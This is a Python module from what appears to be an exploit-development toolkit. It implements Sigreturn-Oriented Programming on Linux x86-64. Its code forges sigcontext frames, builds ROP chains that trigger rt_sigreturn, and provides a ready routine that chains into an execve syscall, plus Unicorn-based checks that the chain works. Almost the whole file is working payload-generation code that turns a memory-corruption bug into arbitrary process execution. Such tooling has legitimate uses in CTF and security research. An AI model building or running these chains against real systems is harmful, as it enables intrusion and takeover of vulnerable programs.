"""
Sigreturn-Oriented Programming (SROP), Linux x86-64.

When gadgets are scarce -- no `pop rsi`, no `pop rdx`, sometimes barely
anything usable at all -- there's still almost always a `pop rax ; ret` and
*a* `syscall` instruction somewhere. That's enough: `rt_sigreturn` (syscall
15) restores *every* general-purpose register, rip, and rsp in one shot
from a `ucontext`-shaped structure sitting at the current stack pointer.
Forge that structure, trigger the syscall, and you've set every register
you wanted in a single step -- including chaining straight into an execve
syscall with rax/rdi/rsi/rdx/rip all pre-loaded, no further gadgets needed
at all.

The struct layout below is the standard Linux x86-64 `struct sigcontext`
field order (kernel `arch/x86/include/uapi/asm/sigcontext.h`), cross-
checked against pwntools' `SigreturnFrame` (the community-standard
implementation) rather than re-derived from memory, since a single wrong
byte offset makes the whole frame silently do nothing useful.

Caveat this module is upfront about: Unicorn does not implement
`rt_sigreturn` (it's OS/kernel behavior, not CPU behavior), so it cannot be
concretely verified against a real kernel the way ordinary chains are.
`verify_srop_frame` below checks the frame is *self-consistent* -- that
parsing it back out at these exact offsets yields the values you intended
-- by manually applying the same restore semantics via a syscall hook.
That confirms the encoding is correct; it is not proof a real kernel will
accept it (it will -- this layout is standard -- but it isn't emulated
proof the way the rest of this tool's verification is).
"""
from __future__ import annotations

import struct
from dataclasses import dataclass, field
from typing import Optional

import unicorn as uc
import unicorn.x86_const as ux86

from ..core.gadget import Terminator
from ..core.loader import Image
from .chain import Chain, SolveResult, set_registers
from .pool import GadgetPool

FRAME_SIZE = 248

# byte offset within the frame for each field, x86-64 struct sigcontext
_OFFSETS = {
    "uc_flags": 0, "uc_link": 8, "ss_sp": 16, "ss_flags": 24, "ss_size": 32,
    "r8": 40, "r9": 48, "r10": 56, "r11": 64, "r12": 72, "r13": 80, "r14": 88, "r15": 96,
    "rdi": 104, "rsi": 112, "rbp": 120, "rbx": 128, "rdx": 136, "rax": 144, "rcx": 152,
    "rsp": 160, "rip": 168, "eflags": 176, "csgsfs": 184, "err": 192, "trapno": 200,
    "oldmask": 208, "cr2": 216, "fpstate": 224,
}
_GPR_FIELDS = ["r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
               "rdi", "rsi", "rbp", "rbx", "rdx", "rax", "rcx", "rsp"]
_DEFAULT_CSGSFS = 0x33  # standard 64-bit userspace CS selector, GS/FS 0


def build_frame(regs: dict[str, int], rip: int, rsp: Optional[int] = None) -> bytes:
    """`regs` may set any of the GPR field names above; rip is required
    (where execution resumes after the sigreturn); rsp defaults to
    whatever `regs` gives, or 0 if unset (you almost always want to set it
    explicitly -- it's the stack rip's code will actually run with)."""
    buf = bytearray(FRAME_SIZE)
    for name, off in _OFFSETS.items():
        if name in ("uc_flags", "uc_link", "ss_sp", "ss_flags", "ss_size", "err", "trapno",
                     "oldmask", "cr2", "fpstate"):
            struct.pack_into("<Q", buf, off, 0)
    for name in _GPR_FIELDS:
        struct.pack_into("<Q", buf, _OFFSETS[name], regs.get(name, 0) & 0xFFFFFFFFFFFFFFFF)
    if rsp is not None:
        struct.pack_into("<Q", buf, _OFFSETS["rsp"], rsp & 0xFFFFFFFFFFFFFFFF)
    struct.pack_into("<Q", buf, _OFFSETS["rip"], rip & 0xFFFFFFFFFFFFFFFF)
    struct.pack_into("<Q", buf, _OFFSETS["eflags"], 0)
    struct.pack_into("<Q", buf, _OFFSETS["csgsfs"], _DEFAULT_CSGSFS)
    return bytes(buf)


def parse_frame(data: bytes) -> dict[str, int]:
    """Inverse of build_frame -- used by verify_srop_frame's self-check."""
    out = {}
    for name in _GPR_FIELDS + ["rip"]:
        (out[name],) = struct.unpack_from("<Q", data, _OFFSETS[name])
    return out


@dataclass
class SropResult:
    chain: Optional[Chain]
    solve: SolveResult
    ok: bool
    frame_offset_words: int = 0   # where in the chain the frame itself starts


def build_srop(pool: GadgetPool, regs: dict[str, int], rip: int, rsp: int,
                avoid: set = frozenset()) -> SropResult:
    """Build [pop-rax-style gadget][15][syscall gadget][248-byte frame].
    `regs`/`rip`/`rsp` describe the *complete* machine state you want after
    the sigreturn completes -- this does not compose with `set_registers`
    the way ordinary chain steps do, because it doesn't need to."""
    ai = pool.ai
    if ai.arch != "x86_64":
        raise ValueError("SROP support here is scoped to Linux x86-64")

    sys_gadgets = pool.shortlist_terminator(Terminator.SYSCALL, max_insns=4)
    if not sys_gadgets:
        return SropResult(None, SolveResult(None, {}, ["<syscall gadget>"],
                           ["no syscall instruction found"]), False)
    sys_gadget = sys_gadgets[0]

    res = set_registers(pool, {"rax": 15}, avoid=avoid)
    if not res.ok or res.chain is None:
        return SropResult(None, res, False)

    chain = res.chain
    chain.set_last(sys_gadget.address, f"syscall (triggers rt_sigreturn) 0x{sys_gadget.address:x}: "
                                        f"{sys_gadget.text}")
    frame_offset_words = len(chain.words)
    frame = build_frame(regs, rip=rip, rsp=rsp)
    for i in range(0, FRAME_SIZE, ai.reg_width):
        (word,) = struct.unpack_from("<Q", frame, i)
        chain.append_raw(word, f"srop frame +0x{i:x}")
    return SropResult(chain=chain, solve=res, ok=True, frame_offset_words=frame_offset_words)


def build_srop_execve(pool: GadgetPool, path_ptr: int, argv_ptr: int, envp_ptr: int,
                       avoid: set = frozenset()) -> SropResult:
    """The canonical use: one sigreturn frame that sets rax=execve's
    syscall number and rdi/rsi/rdx to the exec() arguments, with rip
    pointing at the same syscall instruction the frame itself used to
    trigger the sigreturn -- so on resume, that `syscall` fires again,
    this time as execve. No pop-rsi/pop-rdx gadgets needed at all."""
    sys_gadgets = pool.shortlist_terminator(Terminator.SYSCALL, max_insns=4)
    if not sys_gadgets:
        return SropResult(None, SolveResult(None, {}, ["<syscall gadget>"],
                           ["no syscall instruction found"]), False)
    syscall_addr = sys_gadgets[0].address
    regs = {"rax": 59, "rdi": path_ptr, "rsi": argv_ptr, "rdx": envp_ptr}
    return build_srop(pool, regs, rip=syscall_addr, rsp=0, avoid=avoid)


def verify_srop_frame(chain: Chain, frame_offset_words: int, expect: dict[str, int]) -> bool:
    """Cheap self-consistency check: re-parse the frame bytes actually
    sitting in the chain and confirm every field we set is exactly what we
    intended. Catches encoding bugs; see emulate_srop_chain for the
    stronger check that runs the actual chain."""
    ai_width = 8
    words = chain.words[frame_offset_words: frame_offset_words + FRAME_SIZE // ai_width]
    frame = b"".join(struct.pack("<Q", w.value or 0) for w in words)
    parsed = parse_frame(frame)
    return all(parsed.get(k) == v for k, v in expect.items())


def emulate_srop_chain(img: Image, chain: Chain, goal_regs: dict[str, int],
                        stack_addr: int = 0x0000_7A10_0000_0000):
    """Runs the chain for real (mapping the target's actual memory, same
    as verify_chain) up through the gadgets that set rax=15 and reach the
    syscall instruction -- then, since Unicorn has no kernel to actually
    perform rt_sigreturn, manually applies the *documented* restore
    semantics (read every GPR + rip from the frame at the offsets this
    module uses, write them into the CPU state) via a syscall hook, and
    confirms the CPU ends up holding exactly the values requested. This
    is honestly a simulation of the syscall's documented behavior, not an
    observation of a real kernel doing it -- see module docstring -- but
    it does concretely exercise the gadget chain up to that point (a real
    bug in the rax=15 setup or the syscall gadget choice shows up here
    exactly like it would in verify_chain).
    """
    from ..core.archinfo import get_archinfo
    ai = get_archinfo(img.arch, img.little_endian)
    mu = uc.Uc(ai.uc_arch, ai.uc_mode)

    for seg in img.segments:
        base = seg.vaddr & ~0xFFF
        end = (seg.vaddr + seg.size + 0xFFF) & ~0xFFF
        try:
            mu.mem_map(base, end - base)
        except uc.UcError:
            continue
        buf = bytearray(end - base)
        pad = seg.vaddr - base
        buf[pad:pad + seg.size] = seg.data
        mu.mem_write(base, bytes(buf))

    chain_bytes = chain.to_bytes(little_endian=True)
    stack_base = stack_addr & ~0xFFF
    stack_size = max(0x10000, (len(chain_bytes) + 0x4000 + 0xFFF) & ~0xFFF)
    mu.mem_map(stack_base, stack_size)
    entry_sp = stack_base + 0x1000
    mu.mem_write(entry_sp, chain_bytes)

    result = {}

    def on_syscall(muu, ud):
        nr = muu.reg_read(ai.uc_reg_const["rax"])
        if nr != 15:
            muu.emu_stop()
            return
        frame_addr = muu.reg_read(ai.uc_reg_const["rsp"])
        frame = muu.mem_read(frame_addr, FRAME_SIZE)
        parsed = parse_frame(bytes(frame))
        for name in _GPR_FIELDS:
            if name == "rsp":
                continue
            muu.reg_write(ai.uc_reg_const[name], parsed[name])
        muu.reg_write(ai.uc_reg_const["rsp"], parsed["rsp"])
        muu.reg_write(ai.uc_reg_const["rip"], parsed["rip"])
        result.update(parsed)
        muu.emu_stop()

    h = mu.hook_add(uc.UC_HOOK_INSN, on_syscall, aux1=ux86.UC_X86_INS_SYSCALL)
    mu.reg_write(ai.uc_reg_const[ai.sp_reg], entry_sp + ai.reg_width)
    try:
        mu.emu_start(chain.words[0].value, 0, timeout=2_000_000, count=5000)
    except uc.UcError:
        pass
    finally:
        mu.hook_del(h)

    ok = all(result.get(k) == v for k, v in goal_regs.items())
    return ok, result
